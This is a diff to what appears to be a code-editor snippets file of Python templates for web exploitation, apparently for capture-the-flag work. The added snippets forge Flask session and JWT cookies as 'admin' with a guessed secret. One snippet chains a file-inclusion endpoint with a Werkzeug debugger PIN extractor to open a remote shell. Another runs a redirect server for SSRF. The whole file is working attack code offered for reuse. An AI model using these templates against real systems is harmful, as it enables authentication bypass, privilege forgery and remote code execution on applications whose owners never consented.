@@ -7,5 +7,65 @@
 			"from requestrepo import Requestrepo",
 			"# client = Requestrepo(token='')"
 		]
-	}
+	},
+    "flask sign cookie": {
+		"scope": "python",
+		"prefix": "flask sign cookie",
+		"body": [
+			"from flask_unsign import session as s",
+            "",
+            "cookie = s.sign({'username':'admin'}, 'secret')",
+            "print(cookie)"
+		]
+	},
+    "flask lfi werkzeug debug pin": {
+        "scope": "python",
+        "prefix": "flask lfi werkzeug debug pin",
+        "body": [
+            "from wconsole_extractor import WConsoleExtractor",
+            "import httpx as requests",
+            "",
+            "url = 'http://localhost:5000'",
+            "",
+            "def leak_function(filename) -> str:",
+            "    r = requests.get(f'{url}/lfi?path={filename}')",
+            "    if r.status_code == 200:",
+            "        return r.text",
+            "    else:",
+            "        return ''",
+            "",
+            "extractor = WConsoleExtractor(",
+            "    target=url,",
+            "    leak_function=leak_function",
+            ")",
+            "",
+            "print(f'PIN CODE: {extractor.pin_code}')",
+            "extractor.shell()"
+        ]
+    },
+    "jwt sign cookie": {
+        "scope": "python",
+        "prefix": "jwt sign cookie",
+        "body": [
+            "import jwt",
+            "",
+            "cookie = jwt.encode({'username':'admin'}, 'secret', algorithm='HS256')",
+            "print(cookie)"
+        ]
+    },
+    "flask server redirector ssrf":{
+        "scope": "python",
+        "prefix": "flask server redirector ssrf",
+        "body": [
+            "from flask import Flask, redirect",
+            "app = Flask(__name__)",
+            "",
+            "@app.route('/')",
+            "def index():",
+            "    return redirect('http://127.0.0.1')",
+            "",
+            "if __name__ == '__main__':",
+            "    app.run('0.0.0.0', 1337)"
+        ]
+    },
 }
